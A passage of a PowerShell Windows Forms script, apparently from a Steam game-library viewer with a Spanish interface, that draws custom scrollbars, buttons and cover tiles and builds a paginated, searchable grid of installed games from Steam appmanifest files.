            if ($script:bibCoverAttempted.ContainsKey($aid) -and ((Get-Date) - $script:bibCoverAttempted[$aid]).TotalHours -lt 12) { continue }
            if (@($script:bibCoverJobs | Where-Object { $_.appid -eq $aid }).Count -gt 0) { continue }
            $script:bibCoverNeedsName[$aid] = $needsName
            [void]$script:bibCoverQueue.Add($aid)
            $script:bibCoverQueued[$aid] = $true
        }
        Start-BiblioCoverBatch
    } catch {}
}
function Get-DarkScrollMetrics($bar) {
    $height = [Math]::Max(1,[int]$bar.ClientSize.Height)
    $max = [Math]::Max(0,[int]$bar.Tag.Maximum)
    $page = [Math]::Max(1,[int]$bar.Tag.PageSize)
    $thumb = [Math]::Max(26,[int][Math]::Round($height * ($page / [double]($page + $max))))
    $thumb = [Math]::Min($height,$thumb)
    $travel = [Math]::Max(0,$height - $thumb)
    $top = 0
    if ($max -gt 0 -and $travel -gt 0) { $top = [int][Math]::Round($travel * ([int]$bar.Tag.Value / [double]$max)) }
    return @{Height=$height;Thumb=$thumb;Travel=$travel;Top=$top;Max=$max}
}
function Set-DarkScrollValue($bar,[int]$value) {
    if (-not $bar -or $bar.IsDisposed) { return }
    $v = [Math]::Max(0,[Math]::Min([int]$bar.Tag.Maximum,$value))
    if ($v -eq [int]$bar.Tag.Value) { return }
    $bar.Tag.Value = $v
    $bar.Invalidate()
    $change = $bar.Tag.OnChange
    if ($change) { try { & $change $v } catch {} }
}
function Set-DarkScrollRange($bar,[int]$maximum,[int]$pageSize) {
    if (-not $bar -or $bar.IsDisposed) { return }
    $bar.Tag.Maximum = [Math]::Max(0,$maximum)
    $bar.Tag.PageSize = [Math]::Max(1,$pageSize)
    $bar.Tag.Value = [Math]::Max(0,[Math]::Min([int]$bar.Tag.Maximum,[int]$bar.Tag.Value))
    $bar.Visible = ($bar.Tag.Maximum -gt 0)
    $bar.Invalidate()
}
function New-DarkScrollBar([scriptblock]$OnChange) {
    $bar = New-BufferedPanel
    $bar.BackColor = $script:BG
    $bar.Tag = @{Value=0;Maximum=0;PageSize=100;Dragging=$false;DragOffset=0;Hover=$false;OnChange=$OnChange}
    $bar.Add_Paint({
        param($s,$e)
        $g = $e.Graphics
        $g.SmoothingMode = 'AntiAlias'
        $track = New-Object System.Drawing.SolidBrush($script:CardBG)
        $g.FillRectangle($track,0,0,$s.Width,$s.Height)
        $track.Dispose()
        $m = Get-DarkScrollMetrics $s
        if ($m.Max -gt 0) {
            $color = $script:Cyan
            if (-not $s.Tag.Hover -and -not $s.Tag.Dragging) { $color = [System.Drawing.Color]::FromArgb(145,$script:Cyan) }
            $thumbBrush = New-Object System.Drawing.SolidBrush($color)
            $path = New-RR 2 ($m.Top+2) ($s.Width-5) ([Math]::Max(8,$m.Thumb-4)) 6
            $g.FillPath($thumbBrush,$path)
            $thumbBrush.Dispose(); $path.Dispose()
        }
    })
    $bar.Add_MouseEnter({ param($s); $s.Tag.Hover=$true; $s.Invalidate() })
    $bar.Add_MouseLeave({ param($s); if (-not $s.Tag.Dragging) { $s.Tag.Hover=$false }; $s.Invalidate() })
    $bar.Add_MouseDown({
        param($s,$e)
        if ($e.Button -ne [System.Windows.Forms.MouseButtons]::Left -or $s.Tag.Maximum -le 0) { return }
        $m = Get-DarkScrollMetrics $s
        if ($e.Y -ge $m.Top -and $e.Y -le ($m.Top+$m.Thumb)) {
            $s.Tag.Dragging = $true
            $s.Tag.DragOffset = $e.Y - $m.Top
            $s.Capture = $true
        } else {
            $delta = [Math]::Max(60,[int]$s.Tag.PageSize)
            if ($e.Y -lt $m.Top) { Set-DarkScrollValue $s ([int]$s.Tag.Value-$delta) } else { Set-DarkScrollValue $s ([int]$s.Tag.Value+$delta) }
        }
    })
    $bar.Add_MouseMove({
        param($s,$e)
        if (-not $s.Tag.Dragging) { return }
        $m = Get-DarkScrollMetrics $s
        if ($m.Travel -gt 0) { $top=[Math]::Max(0,[Math]::Min($m.Travel,$e.Y-$s.Tag.DragOffset)); Set-DarkScrollValue $s ([int][Math]::Round($m.Max*($top/[double]$m.Travel))) }
    })
    $bar.Add_MouseUp({ param($s); $s.Tag.Dragging=$false; $s.Capture=$false; $s.Invalidate() })
    return $bar
}
function New-BibNavButton([string]$text,[scriptblock]$click) {
    $button = New-BufferedPanel
    $button.Size = New-Object System.Drawing.Size(96,32)
    $button.Cursor = [System.Windows.Forms.Cursors]::Hand
    $button.Tag = @{Text=$text;Hover=$false;Enabled=$true;Selected=$false}
    $button.Add_MouseEnter({ param($s); $s.Tag.Hover=$true; $s.Invalidate() })
    $button.Add_MouseLeave({ param($s); $s.Tag.Hover=$false; $s.Invalidate() })
    $button.Add_Click($click)
    $button.Add_Paint({
        param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $n=$s.Tag
        if(-not $n.Enabled){$bg=[System.Drawing.Color]::FromArgb(22,28,40)}
        elseif($n.Selected){$bg=[System.Drawing.Color]::FromArgb(23,71,96)}
        elseif($n.Hover){$bg=$script:CardHover}
        else{$bg=$script:CardBG}
        $path=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
        $br=New-Object System.Drawing.SolidBrush($bg)
        $edge=if($n.Selected -or $n.Hover){$script:Cyan}else{$script:CardBorder}
        $pen=New-Object System.Drawing.Pen($edge,1.2)
        $g.FillPath($br,$path);$g.DrawPath($pen,$path);$br.Dispose();$pen.Dispose();$path.Dispose()
        $fg=if($n.Enabled){$script:White}else{$script:Gray};$tb=New-Object System.Drawing.SolidBrush($fg);$sf=New-Object System.Drawing.StringFormat
        $sf.Alignment='Center';$sf.LineAlignment='Center';$g.DrawString($n.Text,$script:FntSub,$tb,(New-Object System.Drawing.RectangleF(0,0,$s.Width,$s.Height)),$sf)
        $tb.Dispose();$sf.Dispose()
    })
    return $button
}
function New-BibBackButton([scriptblock]$click) {
    $button=New-BufferedPanel
    $button.Size=New-Object System.Drawing.Size(112,36)
    $button.Cursor=[System.Windows.Forms.Cursors]::Hand
    $button.Tag=@{Hover=$false}
    $button.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
    $button.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
    $button.Add_Click($click)
    $button.Add_Paint({
        param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $bg=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
        $edge=if($s.Tag.Hover){$script:Cyan}else{$script:CardBorder}
        $path=New-RR 0 0 ($s.Width-1) ($s.Height-1) 12
        $fill=New-Object System.Drawing.SolidBrush($bg);$pen=New-Object System.Drawing.Pen($edge,1.2)
        $g.FillPath($fill,$path);$g.DrawPath($pen,$path);$fill.Dispose();$pen.Dispose();$path.Dispose()
        $arrow=New-Object System.Drawing.Pen($script:Cyan,2.2);$arrow.StartCap='Round';$arrow.EndCap='Round'
        $cx=20;$cy=[int]($s.Height/2)
        $g.DrawLine($arrow,($cx+5),($cy-6),($cx-1),$cy)
        $g.DrawLine($arrow,($cx-1),$cy,($cx+5),($cy+6))
        $g.DrawLine($arrow,($cx-1),$cy,($cx+10),$cy)
        $arrow.Dispose()
        $textBrush=New-Object System.Drawing.SolidBrush($script:White)
        $font=New-Object System.Drawing.Font('Bahnschrift SemiBold',10,[System.Drawing.FontStyle]::Bold)
        $sf=New-Object System.Drawing.StringFormat;$sf.Alignment="Center";$sf.LineAlignment="Center"
        $g.DrawString('Volver',$font,$textBrush,(New-Object System.Drawing.RectangleF(37,0,($s.Width-42),$s.Height)),$sf)
        $font.Dispose();$textBrush.Dispose();$sf.Dispose()
    })
    return $button
}
function Draw-BiblioPlaceholder($graphics,[int]$width,[int]$height,[string]$title,[bool]$showCaption) {
    if($width -lt 4 -or $height -lt 4){return}
    $graphics.SmoothingMode='AntiAlias'
    $graphics.InterpolationMode='HighQualityBicubic'
    $rect=New-Object System.Drawing.Rectangle(0,0,$width,$height)
    $back=New-Object System.Drawing.Drawing2D.LinearGradientBrush($rect,[System.Drawing.Color]::FromArgb(34,52,78),[System.Drawing.Color]::FromArgb(12,18,29),42)
    $graphics.FillRectangle($back,$rect);$back.Dispose()
    $decoration=New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(22,$script:Cyan),1)
    for($i=0;$i -lt 5;$i++){
        $x=[int](($i+1)*$width/6)
        $graphics.DrawLine($decoration,$x,0,[Math]::Min($width,$x+42),$height)
    }
    $decoration.Dispose()
    $size=[Math]::Max(30,[Math]::Min(68,[int]([Math]::Min($width,$height)*0.28)))
    $cx=[int]($width/2);$cy=[int]($height*0.44);$ring=New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(165,$script:Cyan),2.2)
    $graphics.DrawEllipse($ring,($cx-$size/2),($cy-$size/2),$size,$size);$ring.Dispose()
    $points=[System.Drawing.Point[]]@((New-Object System.Drawing.Point(($cx-7),($cy-12))),(New-Object System.Drawing.Point(($cx+12),$cy)),(New-Object System.Drawing.Point(($cx-7),($cy+12))))
    $triangle=New-Object System.Drawing.Drawing2D.GraphicsPath
    $triangle.AddPolygon($points)
    $play=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(220,$script:Cyan))
    $graphics.FillPath($play,$triangle);$play.Dispose();$triangle.Dispose()
    if($showCaption){
        $caption='SIN PORTADA'
        $fontSize=[Math]::Max(8,[Math]::Min(10,[int]($width/17)))
        $font=New-Object System.Drawing.Font('Bahnschrift SemiBold',$fontSize,[System.Drawing.FontStyle]::Bold)
        $brush=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(170,$script:White))
        $format=New-Object System.Drawing.StringFormat;$format.Alignment='Center';$format.LineAlignment='Center'
        $bounds=New-Object System.Drawing.RectangleF(0,($height-31),$width,20)
        $graphics.DrawString($caption,$font,$brush,$bounds,$format)
        $font.Dispose();$brush.Dispose();$format.Dispose()
    }
}
function Get-BiblioInstalledIds {
    $roots=@()
    try{if($script:steamLibs -and $script:steamLibs.Count -gt 0){$roots=@($script:steamLibs)}}catch{}
    if($roots.Count -eq 0){try{$roots=@(Ss3Jd)}catch{$roots=@()}}
    $roots=@($roots|Where-Object{$_ -and (Test-Path -LiteralPath $_)}|Select-Object -Unique)
    $signature=New-Object System.Text.StringBuilder
    foreach($root in $roots){
        $apps=Join-Path $root 'steamapps'
        try{$di=Get-Item -LiteralPath $apps -ErrorAction Stop;[void]$signature.Append($apps).Append('|').Append($di.LastWriteTimeUtc.Ticks).Append(';')}
        catch{[void]$signature.Append($apps).Append('|missing;')}
    }
    $key=$signature.ToString()
    if($script:bibInstalledCacheKey -eq $key -and $script:bibInstalledIds){return $script:bibInstalledIds}
    $ids=@{}
    foreach($root in $roots){
        $apps=Join-Path $root 'steamapps'
        foreach($file in @(Get-ChildItem -LiteralPath $apps -Filter 'appmanifest_*.acf' -File -ErrorAction SilentlyContinue)){
            if($file.BaseName -match '^appmanifest_(\d+)$'){$ids[$Matches[1]]=$true}
        }
    }
    $script:bibInstalledCacheKey=$key
    $script:bibInstalledIds=$ids
    return $ids
}
function Get-BiblioGridMetrics {
    $width=[Math]::Max(180,[int]$script:bibViewport.ClientSize.Width)
    $inner=[Math]::Max(160,$width-24)
    if($script:bibView -eq 'compact'){
        $cellWidth=98
        $columns=[Math]::Max(1,[int][Math]::Floor($inner/[double]$cellWidth))
        $tileWidth=96;$coverWidth=96;$coverHeight=144;$tileHeight=144;$rowHeight=148
    } else {
        $columns=[Math]::Max(1,[int][Math]::Floor($inner/184))
        $cellWidth=[Math]::Max(144,[int][Math]::Floor($inner/[double]$columns))
        $tileWidth=[Math]::Max(128,$cellWidth-12)
        $coverWidth=[Math]::Max(110,$tileWidth-10)
        $coverHeight=[Math]::Max(156,[int][Math]::Round($coverWidth*1.42))
        $tileHeight=$coverHeight+64
        $rowHeight=$tileHeight+12
    }
    return @{Width=$width;Inner=$inner;Columns=$columns;CellWidth=$cellWidth;TileWidth=$tileWidth;CoverWidth=$coverWidth;CoverHeight=$coverHeight;TileHeight=$tileHeight;RowHeight=$rowHeight}
}
function Set-BiblioGridScroll {
    if(-not $script:bibFlow -or -not $script:bibViewport){return}
    $metrics=Get-BiblioGridMetrics
    $script:bibGridMetrics=$metrics
    $script:bibFlow.Width=$metrics.Width
    $total=@($script:bibPageGames).Count
    $rows=0
    if($total -gt 0){$rows=[int][Math]::Ceiling($total/[double]$metrics.Columns)}
    $contentHeight=[Math]::Max([int]$script:bibViewport.ClientSize.Height,(24+$rows*$metrics.RowHeight))
    $script:bibFlow.Height=$contentHeight
    Set-DarkScrollRange $script:bibScroll ([Math]::Max(0,$contentHeight-$script:bibViewport.ClientSize.Height)) $script:bibViewport.ClientSize.Height
    for($i=0;$i -lt $script:bibFlow.Controls.Count;$i++){
        $tile=$script:bibFlow.Controls[$i]
        $row=[int][Math]::Floor($i/[double]$metrics.Columns)
        $col=$i%$metrics.Columns
        $rowCount=[Math]::Min($metrics.Columns,$total-($row*$metrics.Columns))
        $offset=[int][Math]::Floor(($metrics.Inner-($rowCount*$metrics.CellWidth))/2)
        $x=12+$offset+($col*$metrics.CellWidth)+[int][Math]::Floor(($metrics.CellWidth-$metrics.TileWidth)/2)
        $y=12+($row*$metrics.RowHeight)
        $tile.Location=New-Object System.Drawing.Point($x,$y)
        $tile.Size=New-Object System.Drawing.Size($metrics.TileWidth,$metrics.TileHeight)
        if($tile.Controls.Count -gt 1){
            $pic=$tile.Controls[0];$label=$tile.Controls[1]
            if($script:bibView -eq 'compact'){ $pic.Location=New-Object System.Drawing.Point(0,0) } else { $pic.Location=New-Object System.Drawing.Point(5,5) }
            $pic.Size=New-Object System.Drawing.Size($metrics.CoverWidth,$metrics.CoverHeight)
            $label.Location=New-Object System.Drawing.Point(6,($metrics.CoverHeight+10))
            $label.Size=New-Object System.Drawing.Size(($metrics.TileWidth-12),44)
        }
    }
    $script:bibFlow.Location=New-Object System.Drawing.Point(0,-[int]$script:bibScroll.Tag.Value)
}
function Set-BiblioLayout {
    if(-not $script:bibp -or -not $script:bibViewport){return}
    $top=88;$footer=50
    $clientW=[int]$script:bibp.ClientSize.Width
    $viewH=[Math]::Max(100,[int]$script:bibp.ClientSize.Height-$top-$footer)
    $viewW=[Math]::Max(160,$clientW-(2*$PAD)-22)
    $script:bibViewport.Location=New-Object System.Drawing.Point($PAD,$top)
    $script:bibViewport.Size=New-Object System.Drawing.Size($viewW,$viewH)
    $script:bibScroll.Location=New-Object System.Drawing.Point(($PAD+$viewW+4),$top)
    $script:bibScroll.Size=New-Object System.Drawing.Size(14,$viewH)
    $searchW=[Math]::Max(180,$clientW-(2*$PAD)-384)
    $script:bibSearch.Location=New-Object System.Drawing.Point($PAD,50)
    $script:bibSearch.Size=New-Object System.Drawing.Size($searchW,28)
    $filterX=$PAD+$searchW+8
    $script:bibAllBtn.Location=New-Object System.Drawing.Point($filterX,47)
    $script:bibAllBtn.Size=New-Object System.Drawing.Size(86,32)
    $script:bibDownloadedBtn.Location=New-Object System.Drawing.Point(($filterX+94),47)
    $script:bibDownloadedBtn.Size=New-Object System.Drawing.Size(154,32)
    $script:bibViewBtn.Location=New-Object System.Drawing.Point(($filterX+256),47)
    $script:bibViewBtn.Size=New-Object System.Drawing.Size(110,32)
    $script:bibLoadingCard.Location=New-Object System.Drawing.Point([int](($viewW-$script:bibLoadingCard.Width)/2),[int](($viewH-$script:bibLoadingCard.Height)/2))
    $script:bibEmptyState.Location=New-Object System.Drawing.Point(12,[int](($viewH-44)/2))
    $script:bibEmptyState.Size=New-Object System.Drawing.Size([Math]::Max(120,$viewW-24),44)
    $navY=[int]$script:bibp.ClientSize.Height-42
    $script:bibPrev.Location=New-Object System.Drawing.Point($PAD,$navY)
    $script:bibNext.Location=New-Object System.Drawing.Point(($PAD+108),$navY)
    $script:bibPageInfo.Location=New-Object System.Drawing.Point(($PAD+216),($navY+7))
    $script:bibPageInfo.Size=New-Object System.Drawing.Size([Math]::Max(240,$clientW-($PAD+228)),20)
    Set-BiblioGridScroll
}
function Set-BiblioWheel([object]$sender,[object]$eventArgs) {
    if(-not $script:bibScroll -or $script:bibScroll.Tag.Maximum -le 0){return}
    $step=[Math]::Max(70,[int]($script:bibViewport.ClientSize.Height/7))
    $newValue=[int]$script:bibScroll.Tag.Value
    if($eventArgs.Delta -gt 0){$newValue-=$step}else{$newValue+=$step}
    Set-DarkScrollValue $script:bibScroll $newValue
}
function Set-BiblioMode([bool]$downloadedOnly) {
    $script:bibDownloadedOnly=$downloadedOnly
    $script:bibAllBtn.Tag.Selected=(-not $downloadedOnly)
    $script:bibDownloadedBtn.Tag.Selected=$downloadedOnly
    $script:bibAllBtn.Invalidate();$script:bibDownloadedBtn.Invalidate()
    $script:bibFilterKey=$null
    if($script:bibSearch){Refresh-BiblioGrid $script:bibSearch.Text}
}
function Switch-BiblioView{
    if($script:bibView -eq 'grande'){ $script:bibView='compact'; $script:bibViewBtn.Tag.Text='Vista grande'; $script:bibPageSize=120 }
    else { $script:bibView='grande'; $script:bibViewBtn.Tag.Text='Vista compacta'; $script:bibPageSize=96 }
    $script:bibViewBtn.Invalidate()
    $script:bibPage=0;$script:bibFilterKey=$null
    if($script:bibSearch){Refresh-BiblioGrid $script:bibSearch.Text}
}
function Show-BiblioLoading([string]$title,[string]$subtitle) {
    if(-not $script:bibLoadingCard){return}
    $script:bibLoadingCard.Tag.Title=$title
    $script:bibLoadingCard.Tag.Subtitle=$subtitle
    $script:bibFlow.Visible=$false
    $script:bibEmptyState.Visible=$false
    $script:bibLoadingCard.Visible=$true
    $script:bibLoadingCard.BringToFront()
    if($script:bibLoadingTimer){$script:bibLoadingTimer.Start()}
    $script:bibViewport.Invalidate()
}
function New-BiblioBakedImage($srcImg,$gameName) {
    $bmp=New-Object System.Drawing.Bitmap(96,144)
    $gfx=$null
    try{
        $gfx=[System.Drawing.Graphics]::FromImage($bmp)
        $gfx.InterpolationMode=[System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
        $gfx.SmoothingMode='AntiAlias';$gfx.TextRenderingHint='ClearTypeGridFit'
        $gfx.Clear([System.Drawing.Color]::Black)
        $gfx.DrawImage($srcImg,(New-Object System.Drawing.Rectangle(0,0,96,144)))
        $hh=48;$y0=144-$hh
        $lg=New-Object System.Drawing.Drawing2D.LinearGradientBrush((New-Object System.Drawing.Point(0,$y0)),(New-Object System.Drawing.Point(0,144)),[System.Drawing.Color]::FromArgb(0,0,0,0),[System.Drawing.Color]::FromArgb(225,0,0,0))
        $gfx.FillRectangle($lg,(New-Object System.Drawing.Rectangle(0,$y0,96,$hh)));$lg.Dispose()
        if(-not $script:bibNameOverlayFont){ $script:bibNameOverlayFont=New-Object System.Drawing.Font('Bahnschrift',10,[System.Drawing.FontStyle]::Bold) }
        $tb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
        $sh=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(190,0,0,0))
        $sf=New-Object System.Drawing.StringFormat;$sf.Alignment="Center";$sf.LineAlignment="Center";$sf.Trimming="EllipsisCharacter";$sf.FormatFlags=[System.Drawing.StringFormatFlags]::NoWrap
        $gfx.DrawString([string]$gameName,$script:bibNameOverlayFont,$sh,(New-Object System.Drawing.RectangleF(5,107,88,30)),$sf)
        $gfx.DrawString([string]$gameName,$script:bibNameOverlayFont,$tb,(New-Object System.Drawing.RectangleF(4,106,88,30)),$sf)
        $tb.Dispose();$sh.Dispose();$sf.Dispose()
    }catch{} finally { if($gfx){$gfx.Dispose()} }
    return $bmp
}
function New-BiblioTile($game) {
    $tile=New-BufferedPanel
    if($script:bibView -eq 'compact'){ $tile.BackColor=$BG } else { $tile.BackColor=$script:CardBG }
    $tile.Tag=@{Hover=$false;Game=$game}
    $tile.Add_Paint({param($s,$e)
        $e.Graphics.SmoothingMode='AntiAlias'
        if($script:bibView -eq 'compact' -and -not $s.Tag.Hover){return}
        $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
        $br=New-Object System.Drawing.SolidBrush($(if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}))
        $pen=New-Object System.Drawing.Pen($(if($s.Tag.Hover){$script:Cyan}else{$script:CardBorder}),$(if($s.Tag.Hover){1.6}else{1}))
        try{$e.Graphics.FillPath($br,$p);$e.Graphics.DrawPath($pen,$p)}finally{$br.Dispose();$pen.Dispose();$p.Dispose()}
    })
    $tile.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate();if($s.Controls.Count -gt 0){$s.Controls[0].Invalidate()}})
    $tile.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate();if($s.Controls.Count -gt 0){$s.Controls[0].Invalidate()}})
    $pic=New-Object System.Windows.Forms.PictureBox
    if($script:bibView -eq 'compact'){
        $pic.Location=New-Object System.Drawing.Point(0,0)
        $pic.Size=New-Object System.Drawing.Size(96,144)
        $pic.SizeMode=[System.Windows.Forms.PictureBoxSizeMode]::StretchImage
        $pic.BackColor=$BG
    } else {
        $pic.Location=New-Object System.Drawing.Point(5,5)
        $pic.Size=New-Object System.Drawing.Size(150,214)
        $pic.SizeMode=[System.Windows.Forms.PictureBoxSizeMode]::Zoom
        $pic.BackColor=$script:CardBG
    }
    $pic.Cursor=[System.Windows.Forms.Cursors]::Hand;$pic.Tag=$game
    $cover=Get-BiblioCoverPath ([string]$game.appid)
    if($cover -and [System.IO.Path]::GetFileNameWithoutExtension($cover) -like 'thumb_*'){try{$img=[System.Drawing.Image]::FromFile($cover);if($script:bibView -eq 'compact'){ $pic.Image=New-BiblioBakedImage $img ([string]$game.name) } else { $pic.Image=New-Object System.Drawing.Bitmap($img) };$img.Dispose();$pic.AccessibleDescription=$cover}catch{}}
    if(-not $script:bibNameOverlayFont){ $script:bibNameOverlayFont=New-Object System.Drawing.Font('Bahnschrift',10,[System.Drawing.FontStyle]::Bold) }
    $pic.Add_MouseEnter({param($s);if($s.Parent){$s.Parent.Tag.Hover=$true;$s.Parent.Invalidate()};$s.Invalidate()})
    $pic.Add_MouseLeave({param($s);if($s.Parent){$s.Parent.Tag.Hover=$false;$s.Parent.Invalidate()};$s.Invalidate()})
    $pic.Add_Paint({param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias'
        if(-not $s.Image){Draw-BiblioPlaceholder $g $s.Width $s.Height ([string]$s.Tag.name) $true}
        $frame=New-RR 1 1 ($s.Width-3) ($s.Height-3) 7
        $frameColor=if($s.Parent -and $s.Parent.Tag.Hover){$script:Cyan}else{$script:CardBorder}
        $framePen=New-Object System.Drawing.Pen($frameColor,$(if($s.Parent -and $s.Parent.Tag.Hover){2}else{1}))
        try{$g.DrawPath($framePen,$frame)}finally{$framePen.Dispose();$frame.Dispose()}
    })
    $pic.Add_Click({param($s);try{Show-BiblioDetail $s.Tag}catch{}})
    $pic.Add_MouseWheel({param($s,$e);Set-BiblioWheel $s $e})
    $tile.Controls.Add($pic)
    $label=New-Object System.Windows.Forms.Label
    $label.Location=New-Object System.Drawing.Point(6,224);$label.Size=New-Object System.Drawing.Size(140,44)
    $label.ForeColor=$script:White;$label.BackColor=$script:CardBG
    if($script:bibView -eq 'compact'){ if(-not $script:bibCompactFont){ $script:bibCompactFont=New-Object System.Drawing.Font('Bahnschrift',8) }; $label.Font=$script:bibCompactFont } else { $label.Font=$script:FntSub }
    $label.TextAlign=[System.Drawing.ContentAlignment]::MiddleCenter;$label.AutoEllipsis=$true
    $label.Text=[string]$game.name;$label.Cursor=[System.Windows.Forms.Cursors]::Hand;$label.Tag=$game
    $label.Visible=($script:bibView -eq 'grande')
    $label.Add_MouseEnter({param($s);if($s.Parent){$s.Parent.Tag.Hover=$true;$s.Parent.Invalidate();$s.Parent.Controls[0].Invalidate()}})
    $label.Add_MouseLeave({param($s);if($s.Parent){$s.Parent.Tag.Hover=$false;$s.Parent.Invalidate();$s.Parent.Controls[0].Invalidate()}})
    $label.Add_Click({param($s);try{Show-BiblioDetail $s.Tag}catch{}})
    $label.Add_MouseWheel({param($s,$e);Set-BiblioWheel $s $e})
    $tile.Controls.Add($label)
    $tile.Add_MouseWheel({param($s,$e);Set-BiblioWheel $s $e})
    return $tile
}
function Refresh-BiblioGrid([string]$filter) {
    try{
        $fl=$script:bibFlow;if(-not $fl -or $fl.IsDisposed){return}
        if($script:bibRenderTimer){$script:bibRenderTimer.Stop()}
        $f=([string]$filter).Trim().ToLowerInvariant()
        $mode=if($script:bibDownloadedOnly){'installed'}else{'all'}
        $filterKey=$mode+'|'+$f
        if($filterKey -ne $script:bibFilterKey){
            $script:bibPage=0
            $sourceGames=@();try{$sourceGames=$script:bibGames}catch{}
            if($script:bibDownloadedOnly){
                $installed=Get-BiblioInstalledIds
                $sourceGames=@($sourceGames|Where-Object{$installed.ContainsKey([string]$_.appid)})
            }
            if($f){$script:bibFilteredGames=@($sourceGames|Where-Object{([string]$_.name).IndexOf($f,[System.StringComparison]::OrdinalIgnoreCase) -ge 0 -or ([string]$_.appid).IndexOf($f,[System.StringComparison]::OrdinalIgnoreCase) -ge 0})}
            else{$script:bibFilteredGames=@($sourceGames)}
            $script:bibFilterKey=$filterKey
        }
        $total=@($script:bibFilteredGames).Count
        $pageSize=[Math]::Max(1,[int]$script:bibPageSize)
        $pageCount=[Math]::Max(1,[int][Math]::Ceiling($total/[double]$pageSize))
        $script:bibPage=[Math]::Max(0,[Math]::Min($pageCount-1,[int]$script:bibPage))
        $start=[int]$script:bibPage*$pageSize
        $pageGames=@()
        if($start -lt $total){$last=[Math]::Min($total-1,$start+$pageSize-1);$pageGames=@($script:bibFilteredGames[$start..$last])}
        $script:bibPageGames=$pageGames
        $fl.SuspendLayout()
        try{
            foreach($old in @($fl.Controls)){
                try{$oldPic=$old.Controls[0];if($oldPic -and $oldPic.Image){$img=$oldPic.Image;$oldPic.Image=$null;$img.Dispose()}}catch{}
                try{$old.Dispose()}catch{}
            }
            $fl.Controls.Clear()
        }catch{}
        $fl.Visible=$false
        $script:bibBoxes=@{}
        $script:bibRenderQueue=@($pageGames)
        $script:bibRenderIndex=0
        Set-BiblioGridScroll
        try{ Set-DarkScrollValue $script:bibScroll 0 }catch{}
        $script:bibPageInfo.Text=('{0} / {1}    {2} juegos' -f ($script:bibPage+1),$pageCount,$total)
        $script:bibPrev.Enabled=($script:bibPage -gt 0)
        $script:bibNext.Enabled=($script:bibPage -lt ($pageCount-1))
        if($script:bibPrev.Tag){$script:bibPrev.Tag.Enabled=$script:bibPrev.Enabled;$script:bibPrev.Invalidate()}
        if($script:bibNext.Tag){$script:bibNext.Tag.Enabled=$script:bibNext.Enabled;$script:bibNext.Invalidate()}
        if($total -eq 0){
            if($script:bibLoadingTimer){$script:bibLoadingTimer.Stop()}
            $script:bibLoadingCard.Visible=$false
            if($script:bibDownloadedOnly){$script:bibEmptyState.Text='No hay juegos descargados en esta biblioteca.'}
            else{$script:bibEmptyState.Text='No se encontraron juegos.'}
            $script:bibEmptyState.Visible=$true
            if($script:bibOpenWatch){$script:bibOpenWatch.Stop();try{Add-Content -LiteralPath (Join-Path $env:TEMP 'bsmap_biblio_perf.log') -Value ('open_ms={0};games=0;page={1}' -f $script:bibOpenWatch.ElapsedMilliseconds,$script:bibPageSize) -Encoding ASCII}catch{};$script:bibOpenWatch=$null}
        }else{
            $subtitle=if($script:bibDownloadedOnly){'{0} juegos descargados' -f $total}else{'{0} juegos disponibles' -f $total}
            Show-BiblioLoading 'Preparando tu biblioteca' $subtitle
            $script:bibEmptyState.Visible=$false
            if($script:bibRenderTimer){$script:bibRenderTimer.Start()}
        }
        $fl.ResumeLayout($true)
    }catch{
        try{$script:bibRenderTimer.Stop();$script:bibLoadingTimer.Stop();$script:bibLoadingCard.Visible=$false;$script:bibFlow.Visible=$true;$script:bibEmptyState.Text='No se pudo cargar la biblioteca.';$script:bibEmptyState.Visible=$true}catch{}
    }
}
function Switch-ToBiblio{$script:mp.Visible=$false;$script:rp.Visible=$false;$script:sp.Visible=$false;if($script:cdp){$script:cdp.Visible=$false};if($script:bdtp){$script:bdtp.Visible=$false};try{$script:bibPrevState=$form.WindowState;$form.WindowState='Maximized'}catch{};$script:bibp.Visible=$true}
function Switch-FromBiblio{try{$script:bibTimer.Stop()}catch{};try{Stop-BiblioDlWatch}catch{};if($script:bdtp){$script:bdtp.Visible=$false};$script:bibp.Visible=$false;try{if($null -ne $script:bibPrevState){$form.WindowState=$script:bibPrevState}else{$form.WindowState='Normal'}}catch{};$script:mp.Visible=$true}
$script:bibNameJob=$null
$script:bibBulkJob=$null
$script:bibNameCacheFrom=0
$script:bibNameTimer=New-Object System.Windows.Forms.Timer
$script:bibNameTimer.Interval=3000
$script:bibNameTimer.Add_Tick({
    try {
        Update-BiblioNamesFromCache
        $bj=$script:bibBulkJob
        if($bj){
            if($bj.h.IsCompleted){
                try{ $bj.ps.EndInvoke($bj.h) }catch{}
                try{ $bj.ps.Dispose() }catch{}
                $script:bibBulkJob=$null
                Update-BiblioNamesFromCache
                Start-BiblioNameBackfill
            }
            return
        }
        $nj=$script:bibNameJob
        if(-not $nj){ try{$script:bibNameTimer.Stop()}catch{}; return }
        if($nj.h.IsCompleted){
            try{ $nj.ps.EndInvoke($nj.h) }catch{}
            try{ $nj.ps.Dispose() }catch{}
            $script:bibNameJob=$null
            Update-BiblioNamesFromCache
            try{$script:bibNameTimer.Stop()}catch{}
        }
    } catch {}
})
function Update-BiblioNamesFromCache {
    try {
        $cache=Join-Path $env:LOCALAPPDATA 'BastissSteam\lua_nombres_cache.txt'
        if(-not (Test-Path -LiteralPath $cache)){ return }
        $all=@(Get-Content -LiteralPath $cache -ErrorAction SilentlyContinue)
        if(-not $all -or $all.Count -eq 0){ return }
